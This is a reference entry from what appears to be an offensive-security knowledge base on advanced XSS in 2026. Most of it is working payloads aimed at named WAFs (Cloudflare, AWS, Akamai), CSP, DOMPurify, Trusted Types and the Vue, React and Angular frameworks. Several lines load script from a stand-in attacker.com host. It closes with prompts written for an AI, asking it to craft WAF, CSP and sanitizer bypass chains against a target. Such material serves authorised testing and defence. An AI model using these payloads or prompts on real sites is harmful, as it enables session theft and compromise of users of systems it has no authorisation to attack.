---
id: "xss-advanced-2026"
title: "Advanced XSS Techniques & Bypasses (2026 Edition)"
type: "technique"
category: "web-application"
subcategory: "xss"
tags: ["xss", "waf-bypass", "csp-bypass", "mxss", "mutation-xss", "dom-clobbering", "polyglot", "cloudflare", "dompurify", "deep-dig"]
difficulty: "expert"
platforms: ["linux", "macos", "windows"]
related: ["xss-techniques", "xss-basic-payloads", "xss-bypass-payloads"]
updated: "2026-03-30"
---

## Overview

Modern XSS exploitation in 2026 requires bypassing multiple defense layers: WAFs (Cloudflare, AWS WAF, Akamai), Content Security Policy, DOMPurify sanitization, Trusted Types, and framework-level protections (React, Angular, Vue). This guide covers cutting-edge techniques that work against current defenses.

## WAF Bypass Techniques (2026)

### Cloudflare WAF Bypasses

Cloudflare uses regex-based pattern matching. Bypass strategies: HTML entity zero-padding, tab/newline splitting, double URL encoding, invalid attribute prefixes, and JS optional chaining.

```html
<!-- Entity zero-padding (Cloudflare doesn't normalize) -->
<svg onload=prompt%26%230000000040document.domain)>

<!-- Tab/newline splitting in javascript: URI -->
<a href="j&Tab;a&Tab;v&Tab;asc&NewLine;ri&Tab;pt&colon;&lpar;alert(1)&rpar;">X</a>

<!-- Optional chaining syntax not in signatures -->
<svg onx=() onload=window.alert?.()>

<!-- Dynamic import() bypasses inline script blocks -->
<img src=x onError=import('//attacker.com/')>

<!-- Double URL encoding slips past single-decode -->
<--%253cimg%20onerror=alert(1)%20src=a%253e --!>

<!-- Invalid attribute prefix confuses parser -->
<svg on =i onload=alert(domain)>

<!-- Template literal with backticks -->
<img/src=x onError="`${x}`;alert(1);">
```

### AWS WAF Bypasses

AWS WAF uses OWASP Core Rule Set (CRS). CRS lags behind new browser events by 6-12 months.

```html
<!-- Popover API: onbeforetoggle not in CRS -->
<button popovertarget=x>Click</button><xss popover id=x onbeforetoggle=alert(1)>

<!-- onscrollend: Chrome 114+, not in CRS -->
<div onscrollend=alert(1) style="overflow:auto;height:50px"><br><br><br></div>

<!-- content-visibility auto state change: not in any WAF -->
<xss oncontentvisibilityautostatechange=alert(1) style="display:block;content-visibility:auto">

<!-- Scroll Snap events: Chrome 129+, brand new -->
<address onscrollsnapchange=alert(1) style="overflow-y:hidden;scroll-snap-type:x">
  <div style="scroll-snap-align:center">1337</div>
</address>
```

### Akamai WAF Bypasses

```html
<!-- srcdoc HTML entities decode after WAF inspection -->
<iframe srcdoc='&lt;script&gt;parent.alert(1)&lt;/script&gt;'>

<!-- SVG animation events not in Akamai blocklist -->
<svg><animatetransform onbegin=alert(1)>

<!-- details/ontoggle often passes through -->
<details open ontoggle=alert(1)><summary>x</summary></details>
```

## CSP Bypass Techniques

### JSONP Endpoint Abuse
If CSP whitelists a domain that hosts JSONP endpoints, the callback parameter becomes your code.

```html
<!-- Google search JSONP -->
<script src="https://www.google.com/complete/search?client=chrome&q=hello&callback=alert#1"></script>

<!-- Common JSONP endpoints to abuse -->
<!-- accounts.google.com, www.google.com, cdnjs.cloudflare.com, etc. -->
```

### AngularJS Script Gadget
If CSP whitelists a CDN hosting AngularJS, Angular's template engine evaluates expressions.

```html
<script src="https://cdnjs.cloudflare.com/ajax/libs/angular.js/1.0.8/angular.js"></script>
<div ng-app ng-csp>{{$eval.constructor('alert(1)')()}}</div>
```

### Missing Directives
```html
<!-- If object-src is missing -->
<object data="data:text/html;base64,PHNjcmlwdD5hbGVydCgxKTwvc2NyaXB0Pg=="></object>

<!-- If base-uri is missing -->
<base href="https://attacker.com/"><script src="/payload.js"></script>

<!-- srcdoc may inherit weaker CSP -->
<iframe srcdoc='<script src="data:text/javascript,alert(document.domain)"></script>'></iframe>
```

### CSP Header Injection
When user input is reflected into the CSP header itself:
```
/?csp=; script-src * 'unsafe-inline';&xss=<script>alert(1)</script>
```

### Predictable Nonce
When nonces are derived from timestamps or user-agent hashes, calculate valid nonces:
```html
<script nonce="predicted_value">alert(1)</script>
```

## Mutation XSS (mXSS)

mXSS exploits the difference between how sanitizers parse HTML and how browsers re-parse it during DOM insertion. The HTML that leaves the sanitizer is safe — the HTML the browser creates from it is not.

### DOMPurify CVE-2025-26791 (SVG Desc Regex)
```html
<svg><desc>\onload=${alert(1337)}</desc></svg>
```
DOMPurify's regex `/\$\{[^{]+\}/g` fails on backslash escapes in SVG `<desc>`. The browser re-parses and creates an executable event handler.

### DOMPurify Noscript Re-Contextualization
```html
<noscript><img src=x onerror=alert(1)></noscript>
```
During sanitization (JS enabled), `<noscript>` contents = plain text. During DOM insertion, the browser re-evaluates in a different context and the contents become live HTML.

### MathML Namespace Confusion
```html
<!-- Chrome -->
<math><mtext><table><mglyph><style><!--</style>
<img title="--><img src=1 onerror=alert(1)>">

<!-- Firefox (CDATA variant) -->
<math><mtext><table><mglyph><style><![CDATA[</style>
<img title="]]><img src=1 onerror=alert(1)>">
```
`<mglyph>` switches between HTML and MathML namespaces. During sanitization, `<style>` contains CSS text. During insertion, the browser "fixes" markup and entities decode into live elements.

### SVG ForeignObject
```html
<svg><foreignObject><iframe/onload=alert(1)></foreignObject></svg>
```

## DOM Clobbering

DOM clobbering overrides JavaScript variables via HTML elements. Sanitizers like DOMPurify allow `id`, `name`, and `data-*` attributes — which is enough.

### Basic Clobbering
```html
<!-- Overwrite window.config -->
<form name="authConfig" data-next="https://attacker.com/" data-append="true"></form>

<!-- Code that reads window.authConfig.dataset.next gets attacker value -->
```

### HTMLCollection Double-ID
```html
<a id=defaultAvatar><a id=defaultAvatar name=avatar href="cid:&quot;onerror=alert(1)//">

<!-- window.defaultAvatar returns HTMLCollection -->
<!-- .avatar resolves to the named anchor's href (the payload) -->
```

### Chain Clobbering
```html
<form id=config>
  <input name=apiUrl value=https://attacker.com/api>
  <input name=debug value=true>
</form>
<!-- window.config.apiUrl.value = "https://attacker.com/api" -->
```

## Polyglot Payloads

Work across multiple injection contexts simultaneously.

### 0xsobky Ultimate
```
jaVasCript:/*-/*`/*\`/*'/*"/**/(/* */oNcliCk=alert() )//%0D%0A%0D%0A//</stYle/</titLe/</teXtarEa/</scRipt/--!><sVg/<sVg/oNloAd=alert()//>
```
Executes in: HTML (SVG onload), attribute (onclick), JS string (breaks all quote types), and closes style/title/textarea/script contexts.

### Brutelogic 2025
```
JavaScript://%250Aalert?.(1)//'/*\'/*"/*\"/*`/*\`/*%26apos;)/*<!--></Title/</Style/</Script/</textArea/</iFrame/</noScript>\74k<K/contentEditable/autoFocus/OnFocus=/*${/*/;{/**/(alert)(1)}//>
```
Adds optional chaining, contentEditable autofocus (no-interaction), and base href hijack.

## Framework-Specific Bypasses (2026)

### Vue.js 3
```html
<!-- Teleport to script element -->
<teleport to=script:nth-child(2)>alert&lpar;1&rpar;</teleport>

<!-- Emit constructor chain -->
{{$emit.constructor`alert(1)`()}}

<!-- Dynamic component (23 chars!) -->
<x is=script src=//attacker.com>

<!-- Event composedPath traversal to window -->
<img src @error="e=$event.composedPath().pop().alert(1)">

<!-- mXSS via attribute parsing -->
<x title"="&lt;iframe&Tab;onload&Tab;=alert(1)&gt;">
```

### React
```jsx
<!-- dangerouslySetInnerHTML with user input -->
<div dangerouslySetInnerHTML={{ __html: userInput }} />

<!-- javascript: in href (not blocked in all versions) -->
<a href="javascript:alert(document.domain)">Click</a>
```

### AngularJS (1.6+ post-sandbox)
```
{{constructor.constructor('alert(1)')()}}
{{$eval.constructor('alert(1)')()}}
```

## Trusted Types Bypasses

```javascript
// Cross-document: iframe without TT can modify parent DOM
parent.document.body.innerHTML = '<img src=x onerror=alert(1)>';

// Blob URL creates new context without TT
const blob = new Blob(['<script>alert(1)<\/script>'], {type: 'text/html'});
window.open(URL.createObjectURL(blob));

// Permissive default policy = no protection
trustedTypes.createPolicy('default', {
  createHTML: (s) => s  // Pass-through defeats the purpose
});
```

## New Browser Features Enabling XSS (2024-2026)

| Feature | Event | Browser Support | WAF Coverage |
|---------|-------|-----------------|-------------|
| Popover API | `onbeforetoggle`, `ontoggle` | Chrome 114+, Firefox 125+ | None |
| Content Visibility | `oncontentvisibilityautostatechange` | Chrome 85+ | None |
| Scroll Snap | `onscrollsnapchange`, `onscrollsnapchanging` | Chrome 129+ | None |
| Scroll End | `onscrollend` | Chrome 114+, Firefox 109+ | Partial |
| `<dialog>` | `onclose`, `oncancel` | All modern | Partial |
| `<search>` element | Standard focus events | Chrome 118+, Firefox 118+ | None |
| `setHTML()` API | N/A (sanitizer) | Firefox 148+, Chrome 124+ | N/A |

## Deep Dig Prompts

```
Given this target with these defenses [WAF type, CSP header, sanitizer, framework]:
1. Identify which WAF bypass payloads are most likely to work.
2. Analyze the CSP for missing directives (object-src, base-uri, script-src wildcards).
3. Find JSONP endpoints on whitelisted CSP domains.
4. If DOMPurify is in use, check the version and suggest mXSS payloads.
5. Identify the frontend framework and suggest framework-specific gadgets.
6. Craft 3 attack chains combining WAF bypass + CSP bypass + sanitizer bypass.
```

```
Analyze this CSP header [paste]:
1. List every bypass opportunity (missing directives, wildcards, unsafe-eval, JSONP-able domains).
2. Check if any whitelisted CDN hosts AngularJS or other script gadgets.
3. Test for CSP injection if any directive reflects user input.
4. Suggest the shortest path from injection to JavaScript execution under this policy.
```

```
I found a reflected XSS behind [WAF name] with [CSP details]:
1. Generate 20 WAF-specific bypass payloads for this vendor.
2. Test each payload against the CSP restrictions.
3. Suggest event handlers from 2024-2026 that aren't in the WAF's blocklist.
4. Provide a polyglot payload that works regardless of the injection context.
```

## Tools

- **XSStrike** — Fuzzing with WAF bypass and context detection
- **Dalfox** — Parameter analysis and XSS scanning with 2026 payloads
- **Burp Suite** — Manual testing with Intruder and Collaborator
- **DOMPurify** — Test sanitizer bypass with different versions
- **CSP Evaluator** — Google's CSP analysis tool
- **csp-bypass.com** — Known bypass payloads per CSP directive
- **BountyBud XSS Generator** — Context-aware payload generation with encoding
